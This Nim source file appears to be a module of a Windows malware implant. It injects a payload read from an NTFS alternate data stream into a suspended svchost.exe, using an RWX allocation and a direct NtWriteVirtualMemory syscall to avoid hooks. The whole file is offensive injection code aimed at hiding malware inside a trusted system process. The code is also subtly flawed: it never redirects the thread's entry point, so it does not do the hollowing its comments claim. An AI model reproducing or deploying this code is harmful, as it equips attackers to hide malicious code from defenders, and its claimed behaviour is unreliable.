# hollow.nim — Process hollowing into svchost.exe
#
# Bug fix (hollow.rs:60): called `crate::resurrect::read_ads()` which was
# private. Fixed: resurrect.nim now exports `readAds*` as a public proc.

import winim
import syscall, resurrect

const SVCHOST_PATH = "C:\\Windows\\System32\\svchost.exe"

proc svchostPath(): seq[uint16] =
  var r = newSeq[uint16](SVCHOST_PATH.len + 1)
  for i, c in SVCHOST_PATH:
    r[i] = uint16(c)
  r[SVCHOST_PATH.len] = 0
  r

proc injectSvchost*(): bool =
  # unsafe
  var path = svchostPath()
  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  zeroMem(addr si, sizeof(si))
  zeroMem(addr pi, sizeof(pi))
  si.cb = DWORD(sizeof(STARTUPINFOW))

  if CreateProcessW(
    cast[LPCWSTR](addr path[0]),
    nil, nil, nil, 0,
    CREATE_SUSPENDED,
    nil, nil,
    addr si, addr pi) == 0:
    return false

  # Read ADS payload — readAds is now public (was private in Rust, fixed)
  let payload = readAds()
  if payload.len == 0:
    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)
    return false

  # Allocate RWX region in target
  let remoteBase = VirtualAllocEx(
    pi.hProcess,
    nil,
    SIZE_T(payload.len),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE)
  if remoteBase == nil:
    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)
    return false

  # NtWriteVirtualMemory via syscall
  let ssnWvm = resolveSsn("NtWriteVirtualMemory")
  if ssnWvm == 0:
    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)
    return false

  var bytesWritten: uint = 0
  discard doSyscall(
    ssnWvm,
    cast[uint](pi.hProcess),
    cast[uint](remoteBase),
    cast[uint](unsafeAddr payload[0]),
    uint(payload.len),
    cast[uint](addr bytesWritten),
    0)

  # Resume thread
  discard ResumeThread(pi.hThread)

  discard CloseHandle(pi.hThread)
  discard CloseHandle(pi.hProcess)
  true

proc run*(payload: seq[byte]): bool =
  discard payload
  injectSvchost()
